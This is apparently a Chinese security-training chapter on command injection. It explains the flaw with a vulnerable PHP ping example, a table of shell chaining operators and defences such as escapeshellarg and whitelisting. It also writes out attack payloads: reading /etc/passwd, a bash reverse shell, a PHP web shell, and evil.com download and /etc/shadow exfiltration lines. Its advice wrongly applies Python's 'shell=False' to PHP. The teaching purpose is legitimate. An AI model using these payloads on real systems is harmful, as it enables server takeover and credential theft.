# 5. 命令注入

## 是什么？

当应用调用系统命令时，把用户输入拼接进命令字符串，攻击者可以注入额外的系统命令。

## 🧠 原理

```php
# 不安全的代码
$ip = $_GET['ip']/$_POST['ip']
echo system('ping'.$ip)
```

正常输入 `127.0.0.1`：

```bash
ping 127.0.0.1
```

攻击者输入 `127.0.0.1; cat /etc/passwd`：

```bash
ping 127.0.0.1; cat /etc/passwd
                      └────── 第二条命令也执行了！
```

## 🔗 命令连接符

| 符号 | 效果 | 示例 |
|------|------|------|
| `;` | 顺序执行（不管前面成不成功） | `ping 127.0.0.1; ls` |
| `&&` | 前面成功才执行后面 | `ping 127.0.0.1 && ls` |
| `\|\|` | 前面失败才执行后面 | `ping x \|\| ls` |
| `\|` | 管道，前面输出作为后面输入 | `echo "test" \| wc -l` |
| `&` | 后台执行 | `ping 127.0.0.1 & ls` |
| `\`` | 命令替换 | `` ping `whoami`.com `` |
| `$()` | 命令替换（现代） | `ping $(whoami).com` |

### 进阶：反弹 Shell

```bash
# Linux
127.0.0.1; bash -c 'bash -i >& /dev/tcp/你的IP/4444 0>&1'

# 也可以先把 shell 写到文件
127.0.0.1; echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## 🛡️ 防御方法

### ✅ 方案 1：不要调用系统命令（最好）

用库函数替代：
```php
# ❌ 不要这样
echo system('系统命令')

// ✅ 用 PHP 内置
$ip = escapeshellarg($ip);
exec("ping -c 3 $ip", $output, $retval);
```

### ✅ 方案 2：参数化

```php
// ✅ 使用 escapeshellarg 参数化（防止注入）
$ip = escapeshellarg($ip);
exec("ping -c 3 $ip", $output, $retval);
```

关键：`shell=False`（默认），不要把整个命令作为字符串传给 shell。

### ✅ 方案 3：白名单校验

```php
if (!preg_match('/^[0-9.]+$/', $ip)) {
    throw new Exception("非法 IP 地址");
}
```

## 💀 命令注入能做什么？

- ✅ 查看任意文件（`cat /etc/passwd`）
- ✅ 反弹 Shell（完全控制服务器）
- ✅ 横向移动（攻击内网其他机器）
- ✅ 下载恶意程序（`wget evil.com/trojan`）
- ✅ 数据外传（`curl evil.com -d "$(cat /etc/shadow)"`）

---

## 📝 练习

1. 先用靶场执行 `whoami` / `dir`
2. 尝试读系统文件
3. 试试不同的连接符（`&`、`|`、`&&`）

---

**下一步**：[文件上传漏洞](06-file-upload.md)
